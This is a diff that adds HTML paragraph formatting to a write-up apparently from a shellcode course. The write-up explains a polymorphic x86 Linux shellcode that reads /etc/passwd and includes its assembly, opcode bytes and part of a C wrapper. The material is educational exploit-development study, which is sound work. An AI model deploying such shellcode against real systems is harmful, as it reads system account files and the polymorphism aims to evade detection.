@@ -1,6 +1,6 @@
 # File Reader
 
-Address of the original shellcode:
+<p style="text-align: justify;">Address of the original shellcode:</p>
 - http://shell-storm.org/shellcode/files/shellcode-73.php
 
 Original source code:
@@ -70,7 +70,7 @@ char main[]=
 "\xff"
 "/etc/passwd"; //Put here the file path, default is /etc/passwd
 ```
-I will try to present my polymorphic shellcode in parts (and finally the whole) in order to explain in detail the changes and improvements I have made.
+<p style="text-align: justify;">I will try to present my polymorphic shellcode in parts (and finally the whole) in order to explain in detail the changes and improvements I have made.</p>
 
 ### Clearing 
 
@@ -95,10 +95,12 @@ _start:
 	xor eax, eax
 	jmp two
 ```
-The EBX, ECX and EDX registers are empty when you enter the _start() function, so there is no need to clean them.
+<p style="text-align: justify;">The EBX, ECX and EDX registers are empty when you enter the _start() function, so there is no need to clean them.</p>
+
  ### sys_open() 
  
-The "two" section remains unchanged and remains at the end of our code
+<p style="text-align: justify;">The "two" section remains unchanged and remains at the end of our code</p>
+
 ```nasm
  two:
   call one
@@ -121,7 +123,7 @@ The "two" section remains unchanged and remains at the end of our code
 	int 0x80
 	mov esi, eax
 ```
- When this part of the code is called, the ECX index is empty, so there is no need to clean it again. Due to the change in the order of the sections in the code - I moved the "exit" section directly after the "read" section - the "jmp read" instruction is no longer needed, as the "read" section code lines immediately follow the "one" section.
+<p style="text-align: justify;">When this part of the code is called, the ECX index is empty, so there is no need to clean it again. Due to the change in the order of the sections in the code - I moved the "exit" section directly after the "read" section - the "jmp read" instruction is no longer needed, as the "read" section code lines immediately follow the "one" section.</p>
  
  ### sys_read()
  
@@ -144,7 +146,7 @@ The "two" section remains unchanged and remains at the end of our code
 	mov dl, 1
 	int 0x80
 ```
-I replaced two instructions - changing the ESP value, i.e. top of the stack (sub esp, 1) and pointing his pointer to ECX index (lea ecx, [esp]), to one instruction placing the top of the stack directly in the ECX register (mov ecx, esp ).
+<p style="text-align: justify;">I replaced two instructions - changing the ESP value, i.e. top of the stack (sub esp, 1) and pointing his pointer to ECX index (lea ecx, [esp]), to one instruction placing the top of the stack directly in the ECX register (mov ecx, esp ).</p>
 
 ### sys_write()
 
@@ -169,7 +171,7 @@ Code after changes:
 	int 0x80
 	jmp read
 ```
-This section has been completely rebuilt. At the beginning, instead of resetting the EBX register and then comparing it to EAX, and if the values are the same (both registers are zero), execute JMP to the "exit" section, EAX using the logical operator OR is compared to zero and if ZF flag is set, JMP to the "exit" section is executed. Then, due to the fact that the EDX register is already 1, instead of two separate instructions, one "mov ebx, edx" is enough to get the same effect. Finally, since we did not use the "sub esp, 1" statement in the sys_read() section, the "add esp, 1" statement is also unnecessary.
+<p style="text-align: justify;">This section has been completely rebuilt. At the beginning, instead of resetting the EBX register and then comparing it to EAX, and if the values are the same (both registers are zero), execute JMP to the "exit" section, EAX using the logical operator OR is compared to zero and if ZF flag is set, JMP to the "exit" section is executed. Then, due to the fact that the EDX register is already 1, instead of two separate instructions, one "mov ebx, edx" is enough to get the same effect. Finally, since we did not use the "sub esp, 1" statement in the sys_read() section, the "add esp, 1" statement is also unnecessary.</p>
 
 ### sys_exit()
 
@@ -187,7 +189,7 @@ exit:
 	inc eax
 	int 0x80
 ```
-After the sys_write () system call, the EAX register contains zero, the MOV instruction is replaced by a simple "inc eax". In addition, cleaning the EBX registry is also unnecessary.
+<p style="text-align: justify;">After the sys_write () system call, the EAX register contains zero, the MOV instruction is replaced by a simple "inc eax". In addition, cleaning the EBX registry is also unnecessary.</p>
 
 ### Full code after changes
 
@@ -236,7 +238,8 @@ $ ./compile.sh file-reader
 [+] Done!
 "\x31\xc0\xeb\x20\x5b\xb0\x05\xcd\x80\x89\xc6\x89\xf3\xb0\x03\x89\xe1\xb2\x01\xcd\x80\x08\xc0\x74\x08\xb0\x04\x88\xd3\xcd\x80\xeb\xea\x40\xcd\x80\xe8\xdb\xff\xff\xff"
 ```
-Shellcode.c wrapper file content (note the file name after shellcode):
+<p style="text-align: justify;">Shellcode.c wrapper file content (note the file name after shellcode):</p>
+
 ```c
 #include<stdio.h>
 #include<string.h>
